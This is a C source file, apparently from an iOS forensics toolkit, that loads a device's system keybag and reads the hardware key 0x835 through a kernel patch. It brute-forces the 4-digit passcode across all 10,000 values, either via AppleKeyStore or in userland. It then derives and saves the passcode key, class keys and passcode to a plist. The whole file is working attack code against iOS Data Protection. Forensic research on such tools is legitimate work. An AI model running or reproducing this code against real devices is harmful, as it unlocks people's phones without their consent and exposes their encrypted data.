#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <CoreFoundation/CoreFoundation.h>
#include "AppleKeyStore.h"
#include "IOKit.h"
#include "IOAESAccelerator.h"
#include "registry.h"
#include "util.h"
#include "device_info.h"
#include "remote_functions.h"
/*
 #define MobileKeyBagBase 0x354cb000
 
 CFDictionaryRef (*AppleKeyStore_loadKeyBag)(char*, char*) = MobileKeyBagBase + 0x50A8;
 int (*AppleKeyStoreKeyBagSetSystem)(int) = MobileKeyBagBase + 0x910;
 int (*AppleKeyStoreKeyBagCreateWithData)(CFDataRef, int*) = MobileKeyBagBase + 0xC88;
 */
/*
 /private/var/mobile/Library/ConfigurationProfiles/PublicInfo/EffectiveUserSettings.plist.plist
 plist["restrictedValue"]["passcodeKeyboardComplexity"]
 */

void saveKeybagInfos(CFDataRef kbkeys, KeyBag* kb, uint8_t* key835, char* passcode, uint8_t* passcodeKey, CFMutableDictionaryRef classKeys)
{
    CFMutableDictionaryRef out = device_info(-1, NULL);

    CFStringRef uuid = CreateHexaCFString(kb->uuid, 16);
    
    CFDictionaryAddValue(out, CFSTR("uuid"), uuid);
    CFDictionaryAddValue(out, CFSTR("KeyBagKeys"), kbkeys);
    
    addHexaString(out, CFSTR("salt"), kb->salt, 20);
    
    if (passcode != NULL)
    {
        CFStringRef cfpasscode = CFStringCreateWithCString(kCFAllocatorDefault, passcode, kCFStringEncodingASCII);
        CFDictionaryAddValue(out, CFSTR("passcode"), cfpasscode);
        CFRelease(cfpasscode);
    }
    if (passcodeKey != NULL)
        addHexaString(out, CFSTR("passcodeKey"), passcodeKey, 32);
    
    if (key835 != NULL)
        addHexaString(out, CFSTR("key835"), key835, 16);
    if (classKeys != NULL)
        CFDictionaryAddValue(out, CFSTR("classKeys"), classKeys);

    CFStringRef resultsFileName = CFStringCreateWithFormat(kCFAllocatorDefault, NULL, CFSTR("%@.plist"), CFDictionaryGetValue(out, CFSTR("dataVolumeUUID")));
    
    CFStringRef printString = CFStringCreateWithFormat(kCFAllocatorDefault, NULL, CFSTR("Writing results to %@.plist\n"), CFDictionaryGetValue(out, CFSTR("dataVolumeUUID")));
    
    CFShow(printString);
    CFRelease(printString);
    
    saveResults(resultsFileName, out);
    
    CFRelease(resultsFileName);
    CFRelease(uuid);
    CFRelease(out);

}

char* bruteforceWithAppleKeyStore(CFDataRef kbkeys)
{
    uint64_t keybag_id = 0;
    int i;
    char* passcode = (char*) malloc(5);
    memset(passcode, 0, 5);

    AppleKeyStoreKeyBagInit();
    int r = AppleKeyStoreKeyBagCreateWithData(kbkeys, &keybag_id);
    if (r)
    {
        printf("AppleKeyStoreKeyBagCreateWithData ret=%x\n", r);
        free(passcode);
        return NULL;
    }

    printf("keybag id=%x\n", (uint32_t) keybag_id);
    AppleKeyStoreKeyBagSetSystem(keybag_id);
    
    CFDataRef data = CFDataCreateWithBytesNoCopy(0, (const UInt8*) passcode, 4, kCFAllocatorNull);
    
    io_connect_t conn = IOKit_getConnect("AppleKeyStore");
    
    if (!AppleKeyStoreUnlockDevice(conn, data))
    {
        return passcode;
    }

    for(i=0; i < 10000; i++)
    {
        sprintf(passcode, "%04d", i);
        //if (i % 1000 == 0)
        printf("%s\n", passcode);
        if (!AppleKeyStoreUnlockDevice(conn, data))
        {
            return passcode;
        }
    }
    free(passcode);
    return NULL;
}

char* bruteforceUserland(KeyBag* kb, uint8_t* key835)
{
    int i;
    char* passcode = (char*) malloc(5);
    memset(passcode, 0, 5);

    if (AppleKeyStore_unlockKeybagFromUserland(kb, passcode, 4, key835))
        return passcode;

    for(i=0; i < 10000; i++)
    {
        sprintf(passcode, "%04d", i);
        //if (i % 1000 == 0)
        printf("%s\n", passcode);
        if (AppleKeyStore_unlockKeybagFromUserland(kb, passcode, 4, key835))
            return passcode;
    }
    free(passcode);
    return NULL;
}


int main(int argc, char* argv[])
{
    u_int8_t passcodeKey[32]={0};
    char* passcode = NULL;
    int bruteforceMethod = 0;
    int showImages = 0;
    int c;
    
    while ((c = getopt (argc, argv, "ui")) != -1)
    {
        switch (c)
        {
            case 'u':
                bruteforceMethod = 1;
                break;
            case 'i':
                showImages = 1;
                break;
        }
    }
    
    uint8_t* key835 = IOAES_key835();
    
    if (!memcmp(key835, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16))
    {
        printf("FAIL: missing UID kernel patch\n");
        return -1;
    }
    
    CFDictionaryRef kbdict = AppleKeyStore_loadKeyBag("/private/var/keybags","systembag");
    
    if (kbdict == NULL)
    {
        mountDataPartition("/mnt2");
        
        kbdict = AppleKeyStore_loadKeyBag("/mnt2/keybags","systembag");
        if (kbdict == NULL)
        {
            printf("FAILed to load keybag\n");
            return -1;
        }
    }
    
    CFDataRef kbkeys = CFDictionaryGetValue(kbdict, CFSTR("KeyBagKeys")); 
    
    if (kbkeys == NULL)
    {
        printf("FAIL: KeyBagKeys not found\n");
        return -1;
    }
    //write_file("kbblob.bin", CFDataGetBytePtr(kbkeys), CFDataGetLength(kbkeys));    
    KeyBag* kb = AppleKeyStore_parseBinaryKeyBag(kbkeys);
    if (kb == NULL)
    {
        printf("FAIL: AppleKeyStore_parseBinaryKeyBag\n");
        return -1;
    }
    
    //save all we have for now
    saveKeybagInfos(kbkeys, kb, key835, NULL, NULL, NULL);
    
    CFDataRef opaque = CFDictionaryGetValue(kbdict, CFSTR("OpaqueStuff"));
    int keyboardType = 0;
    if (opaque != NULL)
    {
        CFPropertyListRef opq = CFPropertyListCreateWithData(kCFAllocatorDefault, opaque, kCFPropertyListImmutable, NULL, NULL);
        if (opq != NULL && CFGetTypeID(opq) == CFDictionaryGetTypeID())
        {
            CFNumberRef kt = CFDictionaryGetValue(opq, CFSTR("keyboardType"));
            CFNumberGetValue(kt, kCFNumberSInt32Type, &keyboardType);
            CFRelease(opq);
        }
    }
    printf("keyboardType=%d\n", keyboardType);
    if(keyboardType != 0)
    {
        printf("Enter passcode: \n");
        passcode = malloc(100);
        fgets(passcode, 99, stdin);
        passcode[strlen(passcode)-1] = 0;
    }
    else
    {
        //now try to unlock the keybag

        if (bruteforceMethod == 1)
            passcode = bruteforceUserland(kb, key835);
        else
            passcode = bruteforceWithAppleKeyStore(kbkeys);
    }
    if (passcode != NULL)
    {
        if (!strcmp(passcode, ""))
            printf("No passcode set\n");
        else
            printf("Found passcode : %s\n", passcode);
        
        if(!AppleKeyStore_unlockKeybagFromUserland(kb, passcode, strlen(passcode), key835))
        {
            printf("Invalid passcode !\n");
        }
        else
        {
            AppleKeyStore_printKeyBag(kb);

            CFMutableDictionaryRef classKeys = AppleKeyStore_getClassKeys(kb);

            AppleKeyStore_getPasscodeKey(kb, passcode, strlen(passcode), passcodeKey);

            printf("Passcode key : ");
            printBytesToHex(passcodeKey, 32);
            printf("\n");

            printf("Key 0x835 : ");
            printBytesToHex(key835, 16);
            printf("\n");

            //save all we have for now
            saveKeybagInfos(kbkeys, kb, key835, passcode, passcodeKey, classKeys);
            CFRelease(classKeys);
        }

        free(passcode);
    }
    free(kb);

    CFRelease(kbdict);

    return 0;
}
